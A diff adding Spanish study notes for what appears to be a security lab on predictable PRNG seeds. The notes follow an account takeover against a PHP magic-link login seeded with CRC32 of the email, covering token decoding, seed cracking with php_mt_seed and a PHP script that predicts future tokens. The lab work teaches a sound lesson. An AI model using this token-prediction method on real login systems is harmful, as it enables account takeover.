@@ -3,3 +3,91 @@ layout: apunte
 title: "4. Predictable Seed in PRNGs"
 ---
 
+En esta tarea, en foco cambia a los casos donde se usa una semilla predecible para inicializar los PRNGs. Si la semilla es débil o predecible, el atacante puede reproducir la secuencia entera de generación.
+
+Un ejemplo del impacto son los sistemas `CAPTCHA`, donde el valor aleatorio determina el reto CAPTCHA generado para determinar actividad de bots. SI la semilla es predecible un atacante puede predecir estos valores y acceder a areas restringidas de la aplicación sin resolverlo.
+
+Este problema también se manifiesta en sistemas como aplicaciones de juego, donde los PRNGs determinan el resultado. Cuando estos generadores son alimentados con una semilla predecible, los atacantes pueden ganar todo el rato.
+
+----------------------------------------
+<h2>Escenario Práctico</h2>
+En este escenario exploraremos cómo usando semillas predecibles para generar tokens en un login con link puedes conseguir tomar la cuenta de un usuario. El link mágico se genera usando la función de PHP `mt_rand()`, la cual es alimentada con una combinación del valor `CRC32` del email del usuario como constante aleatoria. Analizando el proceso de generación del token, un atacante puede hacer ingeniería inversa a la semilla y predecir tokens válidos.
+
+<h3>Análisis de la Funcionalidad de Link Mágico</h3>
+- Comienza navegando la aplicación web en `http://random.thm:8090/case/` y haz click en `Login with Magic Link`.
+  !**Pasted image 20260319130131.png**
+- La página web permite a los usuarios iniciar sesión a través de in link mágico mandado a su email. Para esta demostración, usa el email: `magic@mail.random.thm`. Introduce la dirección de correo y dale a `Send Magic Link`.
+  !**Pasted image 20260319130442.png**
+- Después de subir el email, verás un mensaje indicando que el magic link se ha mandado a tu email. El link mágico contiene un token que permite a los usuarios iniciar sesión sin introducir una contraseña.
+- Abre la bandeja de entrada del email `magic@mail.random.thm` con la contraseña `Testing@123`. Verás el email así:
+  !**Pasted image 20260319130449.png**
+- En la bandeja de entrada de la víctima verás el link así:
+
+```python
+http://random.thm:8090/case/magic_link_login.php?token=MTEzNTUwODU0MQ==
+```
+
+- El token `MTEzNTUwODU0MQ==` es la versión encodeada en base64 de un número aleatorio generado usando la función de PHP `mt_rand()`.
+
+<h3>Análisis del Código del Lado del Servidor</h3>
+Ahora que hemos visto el magic link, es esencial entender cómo se generó el token en el servidor. El servidor usa la función PHP `mt_rand()` para generar un número random que forma la base del token:
+
+```php
+mt_srand(CONSTANT_VALUE + crc32($email));
+
+$random_number = mt_rand();
+$token = base64_encode($random_number);
+```
+
+- Cuando un usuario hace una petición del magic link, el servidor primero alimenta a la función usando una combinación de valores dinámicos. Esta semilla está determinada por el valor `CRC32` del email del usuario más el valor constante.
+- Una vez que está establecida la semilla, el servidor genera un número random usando `mt_rand()`. Este número random es encodeado en base64 para crear el token incrustado en el magic link.
+- El uso de la función de PHP `mt_rand()` debilita el sistema de seguridad. Esta función es un PRNG, lo que significa que su resultado es determinista. Es decir que una vez conocida la semilla puede predecirse el resultado, y mediante fuerza bruta también a la inversa.
+
+<h3>Decodificando el Token</h3>
+Para proceder con el ataque necesitamos decodear el token en base64 para obtener el número original generado por el servidor. Este número es el output directo de la función `mt_rand()`, la cual ha sido alimentada con un valor predecible.
+
+Una vez decodeada, obtenemos un numero, en nuestro caso `1135508541`. Este número es crucial para el siguiente paso del ataque.
+
+-------------------------------
+<h2>Explotación</h2>
+La herramienta principal que utilizaremos para explotar esta vulnerabilidad es [php_mt_seed](https://www.openwall.com/php_mt_seed/). Esta herramienta está específicamente diseñada para crackear la semilla de la función `mt_rand()`.
+
+El próximo paso es configurar la herramienta para crackear la semilla basada en el número random decodeado. Sabemos el valor de este número, para encontrarla, ejecutamos el siguiente comando:
+
+```bash
+./php_mt_seed 1135508541
+```
+
+Esta herramienta nos dará una serie de posibles semillas. Debemos comprobar cada una individualmente. Una vez obtenido el valor, puedes averiguar el valor constante usado para preparar la semilla. Sólo tienes que restar el valor CRC32 del email.
+
+!**Pasted image 20260319133757.png**
+
+Después de obtener el número, a la semilla, obtenemos el valor constante, en nuestro caso `1337`.Usa el siguiente script de PHP para generar 10 tokens basados en la semilla.
+
+```php
+<?php
+if (isset($_GET['email']) && isset($_GET['constant']) && is_numeric($_GET['constant'])) {
+    $email = $_GET['email'];
+    $constant = (int)$_GET['constant']; 
+
+    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        $seed = crc32($email) + $constant;
+        mt_srand($seed);
+
+        echo "<h3>Predicted Magic Link Tokens for $email</h3>";
+        for ($i = 0; $i < 10; $i++) {
+            $random_number = mt_rand();
+          
+            $token = base64_encode($random_number);
+            echo "Predicted magic link token " . ($i + 1) . ": " . $token . "<br>";
+        }
+    } else {
+      
+        echo "<div style='color:red;'>Invalid email format. Please provide a valid email.</div>";
+    }
+} else {
+    echo "<div style='color:red;'>Please provide valid GET parameters: 'email' (valid email address) and 'constant' (numeric value).</div>";
+}
+?>
+```
+
